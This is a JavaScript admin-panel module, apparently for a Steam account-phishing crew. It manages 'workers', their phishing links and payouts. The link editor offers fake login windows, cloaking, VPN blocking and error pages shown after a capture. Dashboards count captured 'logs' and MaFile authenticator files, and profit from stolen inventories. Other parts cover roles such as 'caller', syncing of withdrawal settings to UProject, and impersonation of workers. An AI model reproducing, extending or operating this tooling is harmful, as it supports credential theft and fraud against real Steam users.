window.PanelMember = (function () {
  let current = null, detail = null, activeTab = "overview", editingLink = null;
  let panelCredentials = null, credentialsVisible = false;
  let onUpdated = null, lastFocused = null;
  const esc = (v) => String(v ?? "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
  const money = (v) => `$${Number(v || 0).toFixed(2)}`;
  const compact = (v) => new Intl.NumberFormat("ru-RU", { notation: "compact" }).format(Number(v || 0));
  const safeUrl = (v) => /^https?:\/\//i.test(String(v || "")) ? String(v) : "#";
  const date = (v) => v ? new Date(v).toLocaleString("ru-RU", { day:"2-digit", month:"short", hour:"2-digit", minute:"2-digit" }) : "—";
  const initials = (m) => String(m?.firstName || m?.username || "U").trim().slice(0,2).toUpperCase();
  const avatar = (m) => /^(?:https?:\/\/|\/)/i.test(String(m?.photoUrl || "")) ? String(m.photoUrl) : "";
  const role = (m) => m?.isCurator ? "Куратор" : m?.isCaller ? "Прозвонщица" : m?.isModerator ? "Модератор" : "Воркер";
  const financeStatus = (status) => ({ approved: "Выплачено", rejected: "Отклонено", pending: "Ожидает", awaiting_payout_link: "Ожидает ссылку" }[String(status || "").toLowerCase()] || status || "—");
  const financeTypeLabel = (item) => item?.type === "withdrawal" ? "Вывод" : item?.type === "transfer" ? "Перевод" : "Начисление";

  function toast(message, type = "ok") {
    const host = document.getElementById("toastHost"); if (!host) return;
    const el = document.createElement("div"); el.className = `toast is-${type}`;
    el.setAttribute("role", type === "error" ? "alert" : "status"); el.textContent = message;
    host.appendChild(el); setTimeout(() => el.remove(), 3200);
  }

  function open(member, opts = {}) {
    current = member; detail = null; editingLink = null; panelCredentials = null; credentialsVisible = false; activeTab = "overview";
    onUpdated = opts.onUpdated || null; lastFocused = document.activeElement;
    const drawer = document.getElementById("drawer");
    drawer.classList.add("is-open", "member-console"); drawer.setAttribute("aria-hidden", "false");
    document.getElementById("drawerBackdrop").classList.add("is-open"); document.body.classList.add("drawer-open");
    renderLoading(); requestAnimationFrame(() => document.getElementById("drawerClose")?.focus()); loadDetail();
  }

  function close() {
    const drawer = document.getElementById("drawer"); if (!drawer?.classList.contains("is-open")) return;
    drawer.classList.remove("is-open", "member-console"); drawer.setAttribute("aria-hidden", "true");
    document.getElementById("drawerBackdrop").classList.remove("is-open"); document.body.classList.remove("drawer-open");
    current = detail = editingLink = panelCredentials = null; credentialsVisible = false;
    if (lastFocused instanceof HTMLElement) lastFocused.focus({ preventScroll: true }); lastFocused = null;
  }

  function renderLoading() {
    document.getElementById("drawerTitle").textContent = current?.username ? `@${current.username}` : `ID ${current?.telegramId || "—"}`;
    document.getElementById("drawerBody").innerHTML = `<div class="member-loading"><span></span><span></span><span></span><p>Собираем статистику участника…</p></div>`;
  }

  async function loadDetail() {
    try {
      detail = await PanelAPI.get(`/admin/members/${current.telegramId}/detail`, { force: true }); current = detail.member; render();
    } catch (error) {
      document.getElementById("drawerBody").innerHTML = `<div class="member-empty"><b>Не удалось открыть карточку</b><span>${esc(error.message)}</span><button class="btn-primary" id="memberRetry">Повторить</button></div>`;
      document.getElementById("memberRetry")?.addEventListener("click", loadDetail);
    }
  }

  async function reload() {
    if (!current) return; PanelAPI.bust(`/admin/members/${current.telegramId}`); await loadDetail();
    if (onUpdated) onUpdated(current);
  }

  function sparkline(series) {
    const values = (series || []).map((row) => Number(row.totalUsd || row.profitUsd || 0)); if (!values.length) return "";
    const max = Math.max(...values, 1), points = values.map((v,i) => `${(i / Math.max(1, values.length - 1)) * 360},${76 - (v / max) * 62}`).join(" ");
    return `<svg class="member-spark" viewBox="0 0 360 82" preserveAspectRatio="none" aria-label="Динамика профита за 30 дней"><defs><linearGradient id="memberArea" x1="0" y1="0" x2="0" y2="1"><stop stop-color="#aeb4b1" stop-opacity=".18"/><stop offset="1" stop-color="#aeb4b1" stop-opacity="0"/></linearGradient></defs><polygon points="0,82 ${points} 360,82" fill="url(#memberArea)"/><polyline points="${points}" fill="none" stroke="#9ca29f" stroke-width="2" vector-effect="non-scaling-stroke"/></svg>`;
  }

  function render() {
    const m = current, overview = detail?.overview || {}, totals = detail?.sites?.totals || {};
    document.getElementById("drawerTitle").textContent = m.username ? `@${m.username}` : `ID ${m.telegramId}`;
    document.getElementById("drawerBody").innerHTML = `<section class="member-hero"><div class="member-avatar"><span>${esc(initials(m))}</span>${avatar(m) ? `<img src="${esc(avatar(m))}" alt="" referrerpolicy="no-referrer"/>` : ""}<i class="${m.isBanned ? "is-bad" : ""}"></i></div><div class="member-identity"><div class="member-name">${esc(m.firstName || m.username || "Без имени")}</div><div class="member-handle">${m.username ? `@${esc(m.username)}` : "username не указан"} · ${esc(m.telegramId)}</div></div><div class="member-hero-actions"><button type="button" class="btn-primary" id="mOpenWorkerPanel" ${m.isBanned ? "disabled title=\"Пользователь заблокирован\"" : ""}>Открыть панель</button><div class="member-hero-badges"><span class="member-role">${esc(role(m))}</span><span class="member-status ${m.isBanned ? "is-bad" : ""}">${m.isBanned ? "Заблокирован" : "Активен"}</span></div></div></section><div class="member-tabs" role="tablist">${[["overview","Обзор"],["finance","Финансы"],["links",`Ссылки · ${totals.links || 0}`],["manage","Управление"]].map(([id,label]) => `<button type="button" role="tab" class="${activeTab === id ? "is-active" : ""}" data-member-tab="${id}">${label}</button>`).join("")}</div><div class="member-tab-content">${activeTab === "overview" ? renderOverview(overview, totals) : activeTab === "finance" ? renderFinance() : activeTab === "links" ? renderLinks() : renderManage()}</div>`;
    bindEvents();
  }

  const metric = (label, value, hint = "") => `<div class="member-metric"><span>${label}</span><strong>${value}</strong>${hint ? `<small>${hint}</small>` : ""}</div>`;
  function renderOverview(o, totals) {
    const k = o.kpi || {}, u = o.user || {};
    const recent = [...(o.recentLogs || []), ...(o.recentMafiles || [])].sort((a,b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0)).slice(0,6);
    const campaignLine = current.campaignTelegramUrl || current.campaignSlug
      ? `<section class="member-block"><div class="member-block-head"><div><span>Реклама</span><h3><code>${esc(current.campaignTelegramUrl || current.campaignSlug)}</code></h3></div></div><div class="member-inline-empty">${current.campaignAttributedAt ? date(current.campaignAttributedAt) : "—"}</div></section>`
      : "";
    return `<div class="member-kpis">${metric("Профит · 30 дней", money(k.profitPeriodUsd), `${k.operationsPeriod || 0} операций`)}${metric("За всё время", money(u.profitTotalUsd), `${u.daysWithTeam || 0} дней в команде`)}${metric("Кошелёк", money(u.walletUsd), `${current.profitPercent}% воркеру`)}${metric("Логи / MaFile", `${k.logsPeriod || 0} / ${k.mafilePeriod || 0}`, "за 30 дней")}</div>${campaignLine}<section class="member-block member-chart-block"><div class="member-block-head"><div><span>Результат</span><h3>Динамика за 30 дней</h3></div><b>${money(k.profitPeriodUsd)}</b></div>${sparkline(o.series)}</section><section class="member-block"><div class="member-block-head"><div><span>Воронка ссылок</span><h3>${totals.links || 0} активных ссылок</h3></div><span>${totals.online || 0} онлайн</span></div><div class="member-funnel"><div><b>${compact(totals.views)}</b><span>Визиты</span></div><i></i><div><b>${compact(totals.auths)}</b><span>Авторизации</span></div><i></i><div><b>${compact(totals.logs)}</b><span>Логи</span></div><i></i><div><b>${compact(totals.mafiles)}</b><span>MaFile</span></div></div></section><section class="member-block"><div class="member-block-head"><div><span>Последние события</span><h3>Логи и MaFile</h3></div></div><div class="member-events">${recent.length ? recent.map((row) => `<div><span class="member-event-dot ${/mafile/i.test(String(row.status || "")) ? "is-mafile" : ""}"></span><p><b>${esc(row.accountName || row.username || row.steamId || "Steam аккаунт")}</b><small>${esc(row.accountTag || row.status || "Лог")} · ${date(row.createdAt)}</small></p><strong>${money(row.inventoryValue || row.totalValue || row.value)}</strong></div>`).join("") : `<div class="member-inline-empty">Событий пока нет</div>`}</div></section>${detail.errors?.length ? `<div class="member-note">Часть данных UProject недоступна: ${esc(detail.errors.map((x) => x.section).join(", "))}</div>` : ""}`;
  }

  function renderFinance() {
    const finance = detail?.finance || {};
    const items = finance.items || [];
    const walletUsd = Number(finance.walletUsd ?? current?.walletUsd ?? 0);
    const reservedUsd = Number(finance.reservedUsd || 0);
    const availableUsd = Number(Math.max(0, walletUsd - reservedUsd).toFixed(2));
    return `<div class="member-kpis">${metric("Баланс", money(walletUsd), reservedUsd > 0 ? `резерв ${money(reservedUsd)}` : "текущий остаток")}${metric("Доступно", money(availableUsd), "к выводу и переводам")}${metric("Операций", items.length, "в истории")}${metric("Процент", `${current.profitPercent}%`, "доля воркера")}</div><section class="member-block"><div class="member-block-head"><div><span>История</span><h3>Начисления и выплаты</h3></div></div><div class="member-events member-finance-list">${items.length ? items.map((item) => {
      const outgoing = item.direction === "out";
      const amountClass = outgoing ? "is-out" : "is-in";
      const sign = outgoing ? "−" : "+";
      const meta = item.type === "withdrawal"
        ? `${financeStatus(item.status)}${item.payoutUrl ? ` · <a href="${esc(safeUrl(item.payoutUrl))}" target="_blank" rel="noopener">транзакция</a>` : ""}`
        : esc(item.label || financeTypeLabel(item));
      return `<div><span class="member-event-dot ${item.type === "withdrawal" ? "is-withdraw" : item.type === "transfer" ? "is-transfer" : ""}"></span><p><b>${esc(financeTypeLabel(item))}${item.type === "withdrawal" && item.method ? ` · ${esc(item.method)}` : ""}</b><small>${meta} · ${date(item.createdAt)}</small></p><strong class="${amountClass}">${sign}${money(item.amountUsd)}</strong></div>`;
    }).join("") : `<div class="member-inline-empty">Транзакций пока нет</div>`}</div></section>`;
  }

  function renderLinks() {
    const links = detail?.sites?.links || []; if (editingLink) return renderLinkEditor(editingLink);
    return `<div class="member-links-head"><div><b>Ссылки участника</b><span>Статистика и быстрые настройки UProject</span></div></div><div class="member-link-list">${links.length ? links.map((link) => `<article class="member-link-card"><div class="member-link-top"><div><span class="member-link-domain">${esc(link.domainName)}</span><a href="${esc(safeUrl(link.url || `https://${link.domainName}/${link.path || ""}`))}" target="_blank" rel="noopener">/${esc(link.path || "автопуть")}</a></div><span class="member-link-live ${link.isPaused ? "is-paused" : ""}">${link.isPaused ? "Пауза" : `${link.online || 0} онлайн`}</span></div><div class="member-link-stats"><span><b>${compact(link.stats?.views)}</b> визитов</span><span><b>${compact(link.stats?.auths)}</b> входов</span><span><b>${compact(link.stats?.logs)}</b> логов</span><span><b>${compact(link.stats?.mafiles)}</b> MaFile</span></div><div class="member-link-foot"><span>${esc(link.templateName || `Шаблон #${link.template || "—"}`)} · ${esc(link.windowType || "FakeWindow")}</span><button type="button" data-edit-link="${esc(link.id)}" data-domain-id="${esc(link.domainId)}">Настроить <b>→</b></button></div></article>`).join("") : `<div class="member-empty"><b>Ссылок пока нет</b><span>Как только воркер создаст ссылку, она появится здесь.</span></div>`}</div>`;
  }

  const toggleField = (name,label,checked) => `<label class="member-toggle-row"><span>${label}</span><input type="checkbox" name="${name}" ${checked ? "checked" : ""}/><i></i></label>`;
  function renderLinkEditor(link) {
    const templates = detail?.templates || [];
    const hasCurrent = templates.some((tpl) => Number(tpl.id) === Number(link.template));
    const templateOptions = `${hasCurrent || !link.template ? "" : `<option value="${esc(link.template)}" selected>${esc(link.templateName || `Шаблон #${link.template}`)}</option>`}${templates.map((tpl) => `<option value="${esc(tpl.id)}" ${Number(tpl.id) === Number(link.template) ? "selected" : ""}>${esc(tpl.name || `Шаблон #${tpl.id}`)}</option>`).join("")}`;
    return `<form class="member-link-editor" id="memberLinkForm"><div class="member-editor-head"><button type="button" data-link-back>← Назад</button><div><span>${esc(link.domainName)}</span><h3>Настройки ссылки</h3></div></div><div class="member-form-grid"><label class="member-field"><span>Путь</span><div class="member-path-input"><i>/</i><input name="path" value="${esc(link.path)}" placeholder="auto" /></div></label><label class="member-field"><span>Шаблон</span><select name="templateId">${templateOptions}</select></label><label class="member-field"><span>Окно</span><select name="windowType"><option value="FakeWindow" ${link.windowType === "FakeWindow" ? "selected" : ""}>Fake Window</option><option value="CurrentWindow" ${link.windowType === "CurrentWindow" ? "selected" : ""}>Текущее окно</option><option value="NewWindow" ${link.windowType === "NewWindow" ? "selected" : ""}>Новое окно</option></select></label></div><div class="member-toggle-list">${toggleField("iframe","Открывать во фрейме",link.iframe)}${toggleField("cloaking","Клоакинг",link.cloaking)}${toggleField("ban_vpn","Блокировать VPN",link.ban_vpn)}${toggleField("logError","Ошибка после обычного лога",link.steam?.logError)}${toggleField("tradeError","Ошибка после Trade",link.steam?.tradeError)}${toggleField("mafileError","Ошибка после MaFile",link.steam?.mafileError)}</div><div class="member-editor-actions"><button type="button" class="btn-ghost" data-link-back>Отмена</button><button type="submit" class="btn-primary">Сохранить в UProject</button></div></form>`;
  }

  const roleToggle = (key,label,desc,enabled) => `<label class="member-role-toggle"><div><b>${label}</b><span>${desc}</span></div><input type="checkbox" data-role="${key}" ${enabled ? "checked" : ""}/><i></i></label>`;
  function roleConfig(kind,title,description,percent,min) {
    return `<form class="member-manage-card" data-role-config="${kind}"><div class="member-manage-title"><span>Публичная карточка</span><h3>${title}</h3></div><label class="member-field"><span>Описание</span><textarea name="description" placeholder="Коротко расскажите о роли">${esc(description)}</textarea></label><div class="member-two-fields"><label class="member-field"><span>Процент</span><input name="percent" type="number" min="1" max="100" value="${Number(percent || 80)}" /></label><label class="member-field"><span>Мин. профитов</span><input name="minProfits" type="number" min="0" value="${Number(min || 0)}" /></label></div><button class="btn-primary" type="submit">Сохранить</button></form>`;
  }

  function renderUprojectAccess(m, settings) {
    const secret = panelCredentials?.password || "";
    const passwordText = secret ? (credentialsVisible ? secret : "•".repeat(Math.max(8, secret.length))) : "••••••••";
    return `<section class="member-manage-card member-uproject-card"><div class="member-manage-title"><span>UProject</span><h3>Доступ и настройки снятия</h3></div>${m.panelUsername ? `<div class="member-credentials"><div><span>Логин</span><code>${esc(m.panelUsername)}</code></div><div><span>Пароль</span><code>${esc(passwordText)}</code></div><button type="button" id="mRevealCredentials">${secret ? (credentialsVisible ? "Скрыть" : "Показать") : "Показать пароль"}</button></div>` : ""}<div class="member-integration"><span class="${settings.upToDate ? "is-ok" : "is-warn"}"></span><div><b>${m.panelUsername ? "Настройки UProject" : "Аккаунт не привязан"}</b><small>${settings.upToDate ? `Применены · ${date(settings.configuredAt)}` : esc(settings.error || "Требуется синхронизация")}</small></div></div><div class="member-editor-actions"><button class="btn-ghost" type="button" data-panel="${m.panelUsername ? "recreate" : "create"}">${m.panelUsername ? "Пересоздать" : "Создать аккаунт"}</button>${m.panelUsername ? `<button class="btn-primary" type="button" id="mSyncSettings">Применить настройки снятия</button>` : ""}</div><details class="member-bind"><summary>Привязать существующий аккаунт</summary><input id="mPanelLogin" placeholder="Логин UProject"/><input id="mPanelPass" type="password" placeholder="Пароль UProject"/><button class="btn-primary" type="button" data-panel="bind">Привязать</button></details></section>`;
  }

  function renderManage() {
    const m = current, settings = detail?.steamSettings || {};
    const pendingMafiles = detail?.pendingMafiles || [];
    const mafileOptions = pendingMafiles.length
      ? pendingMafiles.map((row) => {
          const inv = Number(row.inventoryUsd || row.totalProfit || 0);
          const name = row.accountUsername ? ` · ${row.accountUsername}` : "";
          return `<option value="${esc(row.sourceId)}">#${esc(row.sourceId)}${esc(name)}${inv > 0 ? ` · $${inv.toFixed(2)}` : ""}</option>`;
        }).join("")
      : "";
    return `<div class="member-manage-grid"><section class="member-manage-card"><div class="member-manage-title"><span>Доступ и роли</span><h3>Права участника</h3></div><div class="member-role-toggles">${roleToggle("curator","Куратор","Отображается в списке кураторов",m.isCurator)}${roleToggle("caller","Прозвонщица","Принимает аккаунты на прозвон",m.isCaller)}${roleToggle("moderator","Модератор","Может модерировать чаты",m.isModerator)}${m.branchId ? "" : roleToggle("branch_create","Филиал без $100","Может создать филиал, даже если нет $100 профитов",m.canCreateBranch)}</div></section>${m.isCurator ? roleConfig("curator","Настройки куратора",m.curatorDescription,m.curatorPercent,m.curatorMinProfits) : ""}${m.isCaller ? roleConfig("caller","Настройки прозвонщицы",m.callerDescription,m.callerPercent,m.callerMinProfits) : ""}<section class="member-manage-card"><div class="member-manage-title"><span>Панель воркера</span><h3>Войти от имени участника</h3></div><p class="member-impersonate-hint">Откроет <code>/app/</code> в новой вкладке уже под сессией этого воркера. Действие пишется в аудит-лог.</p><div class="member-editor-actions"><button type="button" class="btn-primary" id="mImpersonateWorker" ${m.isBanned ? "disabled" : ""}>Войти как воркер</button></div></section><section class="member-manage-card"><div class="member-manage-title"><span>Финансы</span><h3>Процент и начисления</h3></div><label class="member-field"><span>Процент воркера</span><div class="member-suffix"><input id="mPercent" type="number" min="1" max="100" value="${m.profitPercent}"/><i>%</i></div></label><label class="member-field"><span>MaFile для профита</span><select id="mProfitMafile"><option value="">Без привязки</option>${mafileOptions}</select></label><div class="member-amount-row"><input id="mProfit" type="number" min="0.01" step="0.01" placeholder="Сумма gross, $"/><button class="btn-primary" id="mProfitBtn">Начислить профит</button></div><div class="member-amount-row"><input id="mWallet" type="number" min="0.01" step="0.01" placeholder="Пополнение, $"/><button class="btn-ghost" id="mWalletBtn">Пополнить</button></div></section>${renderUprojectAccess(m, settings)}<section class="member-manage-card"><div class="member-manage-title"><span>Связь</span><h3>Сообщение в Telegram</h3></div><textarea id="mMsg" class="member-message" placeholder="Напишите сообщение участнику…"></textarea><button class="btn-primary" id="mMsgBtn">Отправить сообщение</button></section><section class="member-manage-card member-danger-zone"><div class="member-manage-title"><span>Опасная зона</span><h3>Ограничение доступа</h3></div><div class="member-editor-actions"><button class="btn-ghost" id="mKick">Исключить из команды</button>${m.isBanned ? `<button class="btn-primary" id="mUnban">Разблокировать</button>` : `<button class="btn-ghost btn-danger" id="mBan">Заблокировать</button>`}</div></section></div>`;
  }

  async function mutate(fn, success, { reloadAfter = true } = {}) {
    try { await fn(); toast(success); if (reloadAfter) await reload(); } catch (error) { toast(error.message, "error"); }
  }

  async function openWorkerPanelAsMember() {
    if (!current?.telegramId || current.isBanned) return;
    const label = current.username ? `@${current.username}` : `ID ${current.telegramId}`;
    const ok = await GarbonaAdminConfirm.open(
      `Открыть панель воркера от имени ${label}? Сессия будет вашей только в новой вкладке.`,
      { title: "Войти как воркер", confirmLabel: "Открыть панель" }
    );
    if (!ok) return;
    try {
      const result = await PanelAPI.post(`/admin/members/${current.telegramId}/impersonate`, {});
      if (!result?.url) throw new Error("impersonate_url_missing");
      const win = window.open(result.url, "_blank", "noopener,noreferrer");
      if (!win) {
        toast("Разрешите всплывающие окна для этой вкладки", "error");
        return;
      }
      toast("Панель воркера открыта");
    } catch (error) {
      toast(error.message || "Не удалось войти", "error");
    }
  }

  function bindEvents() {
    document.querySelectorAll(".member-avatar img").forEach((img) => img.addEventListener("error", () => img.remove()));
    document.querySelectorAll("[data-member-tab]").forEach((b) => b.addEventListener("click", () => { activeTab = b.dataset.memberTab; editingLink = null; render(); }));
    document.getElementById("mOpenWorkerPanel")?.addEventListener("click", openWorkerPanelAsMember);
    document.getElementById("mImpersonateWorker")?.addEventListener("click", openWorkerPanelAsMember);
    document.querySelectorAll("[data-edit-link]").forEach((b) => b.addEventListener("click", () => { editingLink = detail.sites.links.find((l) => String(l.id) === b.dataset.editLink && String(l.domainId) === b.dataset.domainId); render(); }));
    document.querySelectorAll("[data-link-back]").forEach((b) => b.addEventListener("click", () => { editingLink = null; render(); }));
    document.getElementById("memberLinkForm")?.addEventListener("submit", (event) => { event.preventDefault(); const form = event.currentTarget, fd = new FormData(form), l = editingLink; mutate(() => PanelAPI.patch(`/admin/members/${current.telegramId}/links/${l.domainId}/${l.id}`, { path:fd.get("path"), templateId:Number(fd.get("templateId")), windowType:fd.get("windowType"), iframe:form.elements.iframe.checked, cloaking:form.elements.cloaking.checked, ban_vpn:form.elements.ban_vpn.checked, logError:form.elements.logError.checked, tradeError:form.elements.tradeError.checked, mafileError:form.elements.mafileError.checked, mafileSteamRedirect:l.steam?.mafileSteamRedirect, logRedirect:l.steam?.logRedirect, tradeRedirect:l.steam?.tradeRedirect, mafileRedirect:l.steam?.mafileRedirect }), "Ссылка обновлена"); });
    document.querySelectorAll("[data-role]").forEach((input) => input.addEventListener("change", () => mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/role`, { role:input.dataset.role, value:input.checked }), input.checked ? "Роль включена" : "Роль снята")));
    document.querySelectorAll("[data-role-config]").forEach((form) => form.addEventListener("submit", (event) => { event.preventDefault(); const fd = new FormData(form); mutate(() => PanelAPI.patch(`/admin/members/${current.telegramId}/${form.dataset.roleConfig}-settings`, { description:fd.get("description"), percent:Number(fd.get("percent")), minProfits:Number(fd.get("minProfits")) }), "Настройки сохранены"); }));
    document.getElementById("mPercent")?.addEventListener("change", (e) => mutate(() => PanelAPI.patch(`/admin/members/${current.telegramId}/percent`, { percent:Number(e.target.value) }), "Процент сохранён"));
    document.getElementById("mProfitBtn")?.addEventListener("click", () => {
      const sourceId = String(document.getElementById("mProfitMafile")?.value || "").trim();
      mutate(
        () => PanelAPI.post(`/admin/members/${current.telegramId}/profit`, {
          amount: Number(document.getElementById("mProfit").value),
          sourceId,
        }),
        sourceId ? `Профит начислен · MaFile #${sourceId}` : "Профит начислен"
      );
    });
    document.getElementById("mWalletBtn")?.addEventListener("click", () => mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/wallet`, { amount:Number(document.getElementById("mWallet").value) }), "Кошелёк пополнен"));
    document.getElementById("mMsgBtn")?.addEventListener("click", () => mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/message`, { text:document.getElementById("mMsg").value }), "Сообщение отправлено", { reloadAfter:false }));
    document.querySelectorAll("[data-panel]").forEach((b) => b.addEventListener("click", () => mutate(async () => {
      const result = b.dataset.panel === "bind"
        ? await PanelAPI.post(`/admin/members/${current.telegramId}/panel/bind`, { username:document.getElementById("mPanelLogin").value, password:document.getElementById("mPanelPass").value })
        : await PanelAPI.post(`/admin/members/${current.telegramId}/panel/${b.dataset.panel}`, {});
      panelCredentials = null; credentialsVisible = false; return result;
    }, "Доступ UProject обновлён")));
    document.getElementById("mRevealCredentials")?.addEventListener("click", async () => {
      if (panelCredentials) { credentialsVisible = !credentialsVisible; render(); return; }
      try {
        panelCredentials = await PanelAPI.post(`/admin/members/${current.telegramId}/panel/credentials`, {});
        credentialsVisible = true;
        render();
      } catch (error) { toast(error.message, "error"); }
    });
    document.getElementById("mSyncSettings")?.addEventListener("click", () => mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/steam-settings/sync`, {}), "Настройки снятия применены"));
    document.getElementById("mKick")?.addEventListener("click", async () => { if (await GarbonaAdminConfirm.open("Исключить участника из команды?", { confirmLabel:"Исключить" })) mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/kick`, {}), "Участник исключён"); });
    document.getElementById("mBan")?.addEventListener("click", async () => { if (await GarbonaAdminConfirm.open("Заблокировать пользователя?", { confirmLabel:"Заблокировать" })) mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/ban`, { banned:true }), "Пользователь заблокирован"); });
    document.getElementById("mUnban")?.addEventListener("click", () => mutate(() => PanelAPI.post(`/admin/members/${current.telegramId}/ban`, { banned:false }), "Пользователь разблокирован"));
  }

  function mount() {
    document.getElementById("drawerClose")?.addEventListener("click", close); document.getElementById("drawerBackdrop")?.addEventListener("click", close);
    document.addEventListener("keydown", (event) => { if (event.key === "Escape" && document.getElementById("drawer")?.classList.contains("is-open")) close(); });
  }
  return { open, close, mount, toast, reload };
})();
